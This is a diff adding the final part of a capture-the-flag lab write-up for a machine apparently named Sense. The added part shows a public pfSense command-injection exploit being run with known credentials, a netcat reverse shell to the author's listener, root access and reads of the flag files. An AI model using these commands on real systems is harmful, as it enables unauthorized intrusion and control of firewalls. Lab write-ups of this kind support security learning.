@@ -111,6 +111,79 @@ Logging in as rohit/pfsense worked.
 
 The mainpage after logging in shows that pfsense version 2.1.3 is running. Searching for exploits gives us https://www.exploit-db.com/exploits/43560 (pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection) as the top result.   Trying that first, as command injection is what we want.
 
+Downloaded the exploit and ran it, while running a nc listener on port 4321.
+
+```
+$python3 43560.py -h
+usage: 43560.py [-h] [--rhost RHOST] [--lhost LHOST] [--lport LPORT]
+                [--username USERNAME] [--password PASSWORD]
+
+optional arguments:
+  -h, --help           show this help message and exit
+  --rhost RHOST        Remote Host
+  --lhost LHOST        Local Host listener
+  --lport LPORT        Local Port listener
+  --username USERNAME  pfsense Username
+  --password PASSWORD  pfsense Password
+
+$python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.16 --lport 4321 --username rohit --password pfsense
+CSRF token obtained
+Running exploit...
+Exploit completed
+
+```
+
+On my nc listener,
+
+
+```
+$nc -lvnp 4321
+listening on [any] 4321 ...
+connect to [10.10.14.16] from (UNKNOWN) [10.10.10.60] 11637
+sh: can't access tty; job control turned off
+# ls
+GW_WAN-quality.rrd
+WAN_DHCP-quality.rrd
+ipsec-packets.rrd
+ipsec-traffic.rrd
+system-mbuf.rrd
+system-memory.rrd
+system-processor.rrd
+system-states.rrd
+updaterrd.sh
+wan-packets.rrd
+wan-traffic.rrd
+# id
+uid=0(root) gid=0(wheel) groups=0(wheel)
+# ls /root          
+.cshrc
+.first_time
+.gitsync_merge.sample
+.hushlogin
+.login
+.part_mount
+.profile
+.shrc
+.tcshrc
+root.txt
+# cat /root/root.txt
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx86
+# cd /home
+# ls
+.snap
+rohit
+# cd rohit
+# ls
+.tcshrc
+user.txt
+# cat user.txt
+```
+
+On the whole, it was a simple machine with a public exploit that worked without any modifications. Was very straightforward. The directory bruteforcing was interesting though. The Silverstripe tree control software can also be used for exploitation, probably, but since the box was named Sense and the software was pfsense, the focus was on pfsense.
+
+
+
+
 
 
 
